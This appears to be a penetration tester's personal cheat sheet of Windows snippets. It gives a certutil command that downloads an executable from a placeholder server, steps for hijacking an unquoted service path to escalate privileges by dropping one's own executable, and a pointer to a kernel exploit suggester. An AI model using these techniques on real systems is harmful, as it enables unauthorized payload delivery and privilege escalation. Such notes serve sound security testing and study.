# Windows Snippets

wget for Windows:
```
certutil.exe -urlcache -f http://SERVER/FILE.exe OUTFILE.exe
```

Run `dir` recursively:
```
gci -recurse .
```

Unquoted Service Paths:
```
sc qc SERVICENAME # Check if BINARY_PATH_NAME calls an unquoted service path and see if is a priv esc opp
./accesschk /accepteula -uwdq "C:\DIR\FROM\ABOVE" # check write perms of a subdir of BINARY_PATH_NAME so we can commandeer the service call w our own executable
net start SERVICENAME # start the service after dropping our executable into the path
```

Kernel Priv Esc:
- save `systeminfo` output and run through the [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
